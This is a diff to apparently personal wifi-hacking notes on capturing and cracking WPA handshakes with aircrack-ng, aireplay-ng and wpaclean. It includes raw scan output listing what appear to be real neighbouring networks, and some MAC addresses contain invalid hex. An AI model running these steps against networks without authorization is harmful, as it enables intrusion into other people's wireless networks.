@@ -114,7 +114,7 @@ In the airodump-ng Terminal, the WPA handshake will appear once captured
 
 # -h = attacker MAC
 
-                    aireplay-ng -1 0 -e teddy -a 00:14:7K:7E:40:80 -h 00:0F:9K:88:9K:82 wlan0mon
+                    aireplay-ng -1 0 -e teddy -a 00:14:7K:6E:40:80 -h 00:0F:9K:68:9K:82 wlan0mon
 
 # ARP Sniffing and injection is another method
 
@@ -124,7 +124,7 @@ Cracking can be done using aircrack-ng
 
 Note: Use a good Wordlist !
 
-       aircrack-ng -a2 -b 28:33:88:0A:3A:CB -w '/home/lock/28:33:88:0A:6A:CB/why_.txt' '/home/lock/beyond-01.cap'
+       aircrack-ng -a2 -b 28:33:88:0A:3A:CB -w '/home/lock/28:33:68:0A:6A:CB/why_.txt' '/home/lock/beyond-01.cap'
 
 - a [a.mode]: force attack mode (1/WEP, 2/WPA-PSK)
 - b [bssid]: target selection: access point's MAC
@@ -165,7 +165,7 @@ aireplay-ng
 
 Now at some point you're going to realize you're not able to crack every Wi-Fi network you come across and not every Wi-Fi network can be cracked or hacked. It depends on a lot of factors like signal strength, location, password complexity, etc. 
 
-Running Hashcat :
+Cleaning cap file with 'WPA Clean' :
 
 To utilize hashcat we must first turn the .cap file into a workable format for hashcat. Go to the directory that wifite saved the .cap file of the network you're trying to crack and have had no success using default wordlists on.
 
@@ -173,17 +173,76 @@ Using "wpaclean" you can covert your .cap file into the correct format required 
 
 [ wpaclean NEW.cap handshake.cap ]
 
-# Confused about this next part... Where did this new hashcat file come from ??? Is it being created by the "-j" switch after aircrack-ng ???
+How to split handshakes on different files:
 
-# The next command from the tutorial tells me to enter this command:
 
-[  aircrack-ng -j hashcat.hccapx New.cap ]
+It is important to understand the difference between a file in which several handshakes are simply merged and a capture file in a noisy environment. An example of analyzing a file of the first type (using aircrack-ng ):
 
-You now have a hccapx file which is meant only for hashcat. We'll now use the GPU on your host machine to increase password cracking significantly.
+[ aircrack-ng FILE_NAME.cap ]
 
-[  hashcat -m 2500 hashcat.hccapx WORDLIST.txt ]
+# Example is a local AP "main" list ,to checked to see if WPA Handshake was properly achieved :
 
-(  -m 2550 specifies the hash file type which in this case relates to WPA/WPA2 )
+aircrack-ng '/home/sock/Documents/wifi/3_27_22/AP/main/main-01.cap' 
+Reading packets, please wait...
+Opening /home/sock/Documents/wifi/3_27_22/AP/main/main-01.cap
+Read 27874 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  0C:7C:44:A6:FC:6C  Bethany                   WPA (0 handshake)
+   2  0C:7C:26:A6:FC:6D  ATTBethany_Guest          WPA (0 handshake)
+   3  0C:7C:22:A6:FC:6E                            Unknown
+   4  10:0C:68:3C:89:84  ACCESS_DENIED             WPA (0 handshake)
+   5  10:0C:64:3E:FD:24                            Unknown
+   6  10:33:B7:74:42:E9  Bombadillo                Unknown
+   7  12:62:65:CC:59:61  DIRECT-61-HP ENVY 5000 series  Unknown
+   8  16:0C:6B:3C:89:84                            Unknown
+   9  16:0C:6B:6E:FD:24  ACCESS_DENIED             WPA (0 handshake)
+  10  1C:9E:CC:61:AE:FA  GPKG                      Unknown
+  11  1C:9E:CC:68:BE:5F  PlayasBall                WPA (0 handshake)
+  12  1E:9E:CC:62:AE:FB                            Unknown
+
+
+Index number of target network ? 
+yes
+
+Reading packets, please wait...
+Opening /home/sock/Documents/wifi/3_27_22/AP/main/main-01.cap
+Read 27874 packets.
+
+0 potential targets
+
+No matching network found - check your bssid.
+
+
+Quitting aircrack-ng...
+
+		{ EXAMPLE TWO - - }
+
+# Example is a local AP "hillhouse" , checked to see if WPA Handshake was properly achieved :
+
+
+aircrack-ng '/home/sock/Desktop/4_18_22/w1f1_k1t/SharkCaps/hillhouse/newhouse.cap' 
+Reading packets, please wait...
+Opening /home/sock/Desktop/4_18_22/w1f1_k1t/SharkCaps/hillhouse/newhouse.cap
+Read 3 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  88:41:6C:FA:79:B2  Hillhouse1                WPA (1 handshake)
+
+Choosing first network as target.
+
+Reading packets, please wait...
+Opening /home/sock/Desktop/4_18_22/w1f1_k1t/SharkCaps/hillhouse/newhouse.cap
+Read 3 packets.
+
+1 potential targets
+
+Please specify a dictionary (option -w).
+
+
+# END
 
 
 EvilTwin Cracking:
